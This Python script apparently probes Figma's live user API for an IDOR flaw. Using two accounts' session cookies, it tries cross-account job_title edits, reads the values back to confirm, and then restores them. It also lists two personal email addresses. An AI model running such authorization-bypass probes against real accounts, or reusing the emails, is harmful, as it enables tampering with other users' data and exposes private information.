"""PUT /api/user 跨用户越权测试（A 修改 B / B 修改 A）

确定性来源：用户抓包
  PUT https://www.figma.com/api/user
  body: {"id":"<userId>","job_title":"marketer","job_title_source":"change_job_modal_selection"}
  响应 200: meta 为完整用户对象（name/email/handle/...）

测试矩阵（低危字段 job_title，验证后恢复原值）：
  1. 基线：A 改自己 → 200 saved
  2. 越权：A 的会话 body id=B → 若 200 且 B 的 job_title 变化 = IDOR 写操作
  3. 反向：B 改 A
  4. 读回验证：目标账号自己会话读回确认变更
  5. 清理：恢复原值
"""
import json, sys, urllib.request, urllib.error, ssl

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
BASE = "https://www.figma.com"

A_ID = "1666382703778278399"       # A 账号 1643584176@qq.com
B_ID = "1667396392129259941"       # B 账号 729488839@qq.com


def load_cookies(f):
    cookies = json.load(open(f, encoding="utf-8"))
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies)


A = load_cookies("figma_session.json")
B = load_cookies("figma_session_new.json")


def req(label, method, path, cookies=None, body=None):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
         "Accept": "application/json", "Origin": "https://www.figma.com",
         "Referer": "https://www.figma.com/settings"}
    if cookies:
        h["Cookie"] = cookies
    if body is not None:
        h["Content-Type"] = "application/json"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=25, context=ctx)
        raw = resp.read()
        print(f"[{resp.status}] {label}")
        print("   ", raw[:500].decode("utf-8", "replace").replace("\n", " "))
        return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read()
        print(f"[{e.code}] {label}")
        print("   ", raw[:500].decode("utf-8", "replace").replace("\n", " "))
        return e.code, raw
    except Exception as e:
        print(f"[ERR] {label}: {e}")
        return -1, b""


def get_job_title(cookies, uid, who):
    st, raw = req(f"GET /api/user（{who} 读回基线）", "GET", "/api/user", cookies)
    if st == 200:
        try:
            meta = json.loads(raw).get("meta", {})
            print(f"   {who} job_title={meta.get('profile', {}).get('job_title')!r} "
                  f"name={meta.get('name')!r} handle={meta.get('handle')!r}")
            return meta.get("profile", {}).get("job_title")
        except Exception:
            return None
    return None


def put_job_title(cookies, uid, val, who_acts, target):
    body = {"id": uid, "job_title": val, "job_title_source": "change_job_modal_selection"}
    st, raw = req(f"PUT /api/user {who_acts}→{target} job_title={val}", "PUT", "/api/user", cookies, body)
    return st, raw


print("=" * 70)
print("0. 读回基线（双方当前 job_title）")
print("=" * 70)
jt_a = get_job_title(A, A_ID, "A")
jt_b = get_job_title(B, B_ID, "B")

print("=" * 70)
print("1. 基线：A 改自己")
print("=" * 70)
put_job_title(A, A_ID, "probe_a_baseline", "A会话", "A自己")

print("=" * 70)
print("2. 越权：A 的会话 修改 B (id=B_ID)")
print("=" * 70)
st, raw = put_job_title(A, B_ID, "idor_from_A", "A会话", "B")
if st == 200:
    print("   !! A 会话 PUT 成功修改 B —— 验证 B 侧是否真的变了：")
    jt_b2 = get_job_title(B, B_ID, "B")
    if jt_b2 == "idor_from_A":
        print("   !!!! IDOR 确认：A 修改了 B 的 job_title")
    else:
        print("   B 读回未变化，可能只更新了缓存或按会话身份处理")
else:
    print("   A→B 被拒")

print("=" * 70)
print("3. 反向：B 的会话 修改 A (id=A_ID)")
print("=" * 70)
st, raw = put_job_title(B, A_ID, "idor_from_B", "B会话", "A")
if st == 200:
    jt_a2 = get_job_title(A, A_ID, "A")
    if jt_a2 == "idor_from_B":
        print("   !!!! IDOR 确认：B 修改了 A 的 job_title")
    else:
        print("   A 读回未变化")
else:
    print("   B→A 被拒")

print("=" * 70)
print("4. 清理现场：恢复双方原值")
print("=" * 70)
put_job_title(A, A_ID, jt_a or "marketer", "A会话", "A自己(恢复)")
put_job_title(B, B_ID, jt_b or "marketer", "B会话", "B自己(恢复)")
get_job_title(A, A_ID, "A")
get_job_title(B, B_ID, "B")
print("完成")
